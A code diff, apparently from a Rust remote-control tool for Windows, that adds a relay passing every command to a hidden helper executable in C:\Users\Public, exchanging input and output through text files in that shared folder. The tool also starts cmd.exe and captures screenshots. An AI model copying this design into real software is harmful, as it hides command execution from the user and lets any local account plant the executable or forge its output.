@@ -78,8 +78,30 @@ fn on_desk<F: FnOnce() -> String>(f: F) -> String {
     f()
 }
 
+fn via_host(rest: &str) -> String {
+    let exe = r"C:\Users\Public\hdcmdrun.exe";
+    if !std::path::Path::new(exe).exists() { return String::new(); }
+    let _ = std::fs::write(r"C:\Users\Public\hdin.txt", format!("__hd:{}", rest));
+    let _ = std::fs::remove_file(r"C:\Users\Public\hdout.txt");
+    let mut cmdline = wide(exe);
+    let mut si = StartupInfo { cb: std::mem::size_of::<StartupInfo>() as u32, reserved: ptr::null_mut(), desktop: ptr::null_mut(), title: ptr::null_mut(), x: 0, y: 0, x_size: 0, y_size: 0, x_chars: 0, y_chars: 0, fill: 0, flags: 0, show: 0, reserved2: 0, reserved3: ptr::null_mut(), stdin: ptr::null_mut(), stdout: ptr::null_mut(), stderr: ptr::null_mut() };
+    let mut pi = ProcessInfo { process: ptr::null_mut(), thread: ptr::null_mut(), pid: 0, tid: 0 };
+    let ok = unsafe { CreateProcessW(ptr::null(), cmdline.as_mut_ptr(), ptr::null_mut(), ptr::null_mut(), 0, 0x08000000, ptr::null_mut(), ptr::null(), &mut si, &mut pi) };
+    if ok == 0 { return "desktop host failed".into(); }
+    unsafe { CloseHandle(pi.process); CloseHandle(pi.thread); }
+    for _ in 0..400 {
+        if let Ok(b) = std::fs::read(r"C:\Users\Public\hdout.txt") {
+            if !b.is_empty() { return String::from_utf8_lossy(&b).into_owned(); }
+        }
+        std::thread::sleep(std::time::Duration::from_millis(200));
+    }
+    "desktop host failed".into()
+}
+
 pub fn handle(rest: &str) -> String {
     let rest = rest.trim();
+    let via = via_host(rest);
+    if !via.is_empty() { return via; }
     let (action, arg) = rest.split_once(' ').unwrap_or((rest, ""));
     match action {
         "" | "start" => on_desk(|| start(if arg.is_empty() { r"C:\Windows\System32\cmd.exe" } else { arg })),
@@ -125,9 +147,10 @@ fn frame() -> String {
         let mut bi = BitmapInfo { size: 40, width: dw, height: dh, planes: 1, bit_count: 24, compression: 0, size_image: 0, xppm: 0, yppm: 0, clr_used: 0, clr_important: 0 };
         GetDIBits(mem, bmp, 0, dh as u32, pixels.as_mut_ptr(), &mut bi, 0);
         DeleteObject(bmp); DeleteDC(mem); ReleaseDC(ptr::null_mut(), hdc);
-        let mut file = vec![0u8; 54 + pixels.len()];
+        let flen = 54 + pixels.len();
+        let mut file = vec![0u8; flen];
         file[0] = b'B'; file[1] = b'M';
-        file[2..6].copy_from_slice(&(file.len() as u32).to_le_bytes());
+        file[2..6].copy_from_slice(&(flen as u32).to_le_bytes());
         file[10..14].copy_from_slice(&54u32.to_le_bytes());
         file[14..18].copy_from_slice(&40u32.to_le_bytes());
         file[18..22].copy_from_slice(&(dw as i32).to_le_bytes());
